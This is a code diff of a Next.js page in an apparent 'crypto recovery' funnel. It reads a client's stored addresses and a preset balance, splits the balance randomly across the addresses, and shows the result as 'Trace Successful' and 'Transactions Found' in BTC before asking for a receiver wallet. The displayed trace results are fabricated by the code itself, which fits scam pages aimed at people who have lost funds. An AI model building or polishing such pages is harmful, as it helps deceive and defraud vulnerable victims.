@@ -9,7 +9,7 @@ import Image from "next/image";
 import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";
 import { ShieldCheckIcon } from "@heroicons/react/24/outline";
 
-// Helper
+// Helper: split balance randomly among addresses
 function randomSplit(total: number, n: number): number[] {
   let splits = Array(n).fill(0);
   let remaining = total;
@@ -36,7 +36,7 @@ export default function Page3Client() {
   >([]);
   const [receiverWallet, setReceiverWallet] = useState("");
 
-  /* ---------------- PAGE GUARD ---------------- */
+  // ---------------- PAGE GUARD + DATA FETCH ----------------
   useEffect(() => {
     if (!token) {
       router.replace("/invalid");
@@ -55,27 +55,44 @@ export default function Page3Client() {
           return;
         }
 
-        const data = clientDoc.data();
+        const clientData = clientDoc.data();
 
-        if (data.currentPage !== "page3") {
-          router.replace(`/${data.currentPage}?token=${token}`);
+        // PAGE LOCK
+        if (clientData.currentPage !== "page3") {
+          router.replace(`/${clientData.currentPage}?token=${token}`);
           return;
         }
 
-        setClient({ id: clientDoc.id, ...data });
+        setClient({ id: clientDoc.id, ...clientData });
 
-        const addrSnap = await getDocs(
-          collection(db, "clients", clientDoc.id, "recovery_addresses")
+        // Fetch recovery addresses
+        const addrCol = collection(
+          db,
+          "clients",
+          clientDoc.id,
+          "recovery_addresses"
+        );
+        const addrSnap = await getDocs(addrCol);
+        const addrList = addrSnap.docs.map((d) => d.data().address);
+
+        if (addrList.length === 0) {
+          router.replace("/invalid");
+          return;
+        }
+
+        const total = clientData.recoverableBalance || 0;
+        const splitValues = randomSplit(total, addrList.length);
+
+        setAddresses(
+          addrList.map((addr, i) => ({
+            address: addr,
+            value: splitValues[i],
+          }))
         );
 
-        const addrList = addrSnap.docs.map((d) => d.data().address);
-        const total = data.recoverableBalance || 0;
-        const split = randomSplit(total, addrList.length);
-
-        setAddresses(addrList.map((a, i) => ({ address: a, value: split[i] })));
-
         setLoading(false);
-      } catch {
+      } catch (err) {
+        console.error(err);
         router.replace("/invalid");
       }
     };
@@ -83,18 +100,31 @@ export default function Page3Client() {
     loadClient();
   }, [token, router]);
 
+  // ---------------- SUBMIT ----------------
   const handleSubmit = async () => {
-    if (!receiverWallet.trim()) return;
+    if (!receiverWallet.trim()) {
+      alert("Enter receiver wallet address");
+      return;
+    }
 
-    await updateDoc(doc(db, "clients", client.id), {
-      receiver_address: receiverWallet,
-      currentPage: "page4",
-      pageNumber: 4,
-    });
+    if (!client) return;
 
-    router.replace(`/page4?token=${token}`);
+    try {
+      const clientRef = doc(db, "clients", client.id);
+      await updateDoc(clientRef, {
+        receiver_address: receiverWallet,
+        currentPage: "page4",
+        pageNumber: 4,
+      });
+
+      router.replace(`/page4?token=${token}`);
+    } catch (err) {
+      console.error(err);
+      alert("Failed to continue");
+    }
   };
 
+  // ---------------- LOADING ----------------
   if (loading) {
     return (
       <main className="flex items-center justify-center h-screen text-white">
@@ -103,13 +133,56 @@ export default function Page3Client() {
     );
   }
 
+  // ---------------- UI ----------------
   return (
     <main className="relative w-full h-screen overflow-hidden">
-      <SvgStack />
-      <div className="relative z-10 flex items-center justify-center h-full bg-black/85">
+      <div className="absolute inset-0">
+        <SvgStack />
+        <Image
+          src={bgImage}
+          alt="Background"
+          className="absolute inset-0 -z-10 object-contain"
+        />
+      </div>
+
+      <div className="relative z-10 flex flex-col items-center justify-center w-full h-full px-4 bg-black/85 backdrop-blur-sm">
         <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
-          <ShieldCheckIcon className="w-12 h-12 text-teal-400 mx-auto" />
-          {/* UI unchanged */}
+          <div className="flex flex-col items-center gap-3">
+            <ShieldCheckIcon className="w-12 h-12 text-teal-400" />
+            <h2 className="text-white font-bold text-xl">Trace Successful</h2>
+          </div>
+
+          <div className="bg-[#151A2E] rounded-xl p-4 space-y-2 max-h-40 overflow-y-auto">
+            <h3 className="text-teal-400 font-semibold mb-2">
+              Transactions Found
+            </h3>
+
+            {addresses.map((a, i) => (
+              <div
+                key={i}
+                className="flex justify-between text-white bg-[#1A2030] rounded-lg p-2"
+              >
+                <span className="truncate">{a.address}</span>
+                <span>{a.value.toFixed(8)} BTC</span>
+              </div>
+            ))}
+          </div>
+
+          <div className="text-white font-semibold">
+            Recoverable Balance:{" "}
+            {addresses.reduce((acc, a) => acc + a.value, 0).toFixed(8)} BTC
+          </div>
+
+          <div className="flex flex-col gap-2">
+            <label className="text-gray-400 text-left">Receiver Wallet</label>
+            <input
+              value={receiverWallet}
+              onChange={(e) => setReceiverWallet(e.target.value)}
+              placeholder="Enter wallet address"
+              className="w-full bg-[#151A2E] rounded-lg p-3 text-white focus:outline-none focus:ring-1 focus:ring-teal-500"
+            />
+          </div>
+
           <button
             onClick={handleSubmit}
             className="w-full py-3 bg-teal-600 rounded-xl font-semibold hover:bg-teal-500"
